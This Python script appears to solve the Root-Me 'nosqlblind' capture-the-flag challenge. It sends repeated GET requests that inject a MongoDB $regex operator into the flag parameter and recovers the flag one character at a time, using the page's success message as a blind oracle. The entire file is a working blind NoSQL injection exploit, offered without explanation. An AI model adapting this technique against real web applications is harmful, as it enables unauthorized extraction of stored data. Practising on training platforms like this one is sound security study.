import requests
import string

real_url = "http://challenge01.root-me.org/web-serveur/ch48/index.php"
chall_name = "nosqlblind"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Cookie": "_ga_SRYSKX09J7=GS1.1.1721358971.20.1.1721359286.0.0.0; _ga=GA1.1.837272282.1715683468"
}
def flag_finder():
    for _ in range(40):
        flag = ""
        found = False
        while not found:
            found_in_this_iteration = False
            for c in string.printable:
                if c in [".", "?", "^", "\\","#","&","*"]:
                    continue
                print(f"Testing character: {c}")
                test_flag = f"{flag}{c}"
                url = f"{real_url}?chall_name={chall_name}&flag[$regex]=^{test_flag}.*"
                try:
                    response = requests.get(url, headers=headers)
                    if response.status_code != 200:
                        print(f"Error: Received status code {response.status_code}")
                        continue
                    if "Yeah this is the flag for nosqlblind!" in response.text:
                        flag += c
                        found_in_this_iteration = True
                        print(f"Current flag: {flag}")
                        break
                except requests.exceptions.RequestException as e:
                    print(f"Request failed: {e}")
            if not found_in_this_iteration:
                found = True
        print(f"Final flag after iteration {_+1}: {flag}")

flag_finder()
